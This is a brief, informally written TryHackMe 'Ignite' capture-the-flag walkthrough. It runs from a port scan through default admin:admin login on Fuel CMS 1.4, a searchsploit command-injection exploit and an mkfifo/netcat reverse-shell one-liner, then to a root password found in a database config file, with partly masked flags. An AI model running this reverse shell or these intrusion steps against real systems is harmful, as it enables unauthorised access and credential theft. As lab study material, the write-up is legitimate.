`Tryhackme  Ignite`
--
By :- Unknownperson
-- 

## Port Scanning:- [80]

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)

> Port 80 have website hosting <b>Fuel CMS
Version 1.4</b> <br>
> Login page is on :- http://{IP}/fuel<br>
> I tried Default password was :- <b>admin:admin</b> And gess waht we got accesss in that <br>
> Than we serchsploit this Fuel cms 1.4 so we get <b>50477.py</b><br>
>So we get our Command Injection Screipt so we got reverse shell throw
#
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {tun0} 5555 >/tmp/f
#
-> Than after Searching All thing's like :- 
	> ID , crontab , sudo -l , history , suid's , kernal version ....etc <br>
-> We got thing in <b>/var/www/html/fuel/application/config.database.php</b>
-> Which Contain Root Password  
## root:m****e ##
##
Q1. user.txt :- 6***e394cbf6dab6a91682cc85***59b
Q2. Root.txt :- b9bbcb33e11***be759c4***4862482d
##

`
At this Way Again We pawnd New Machine
`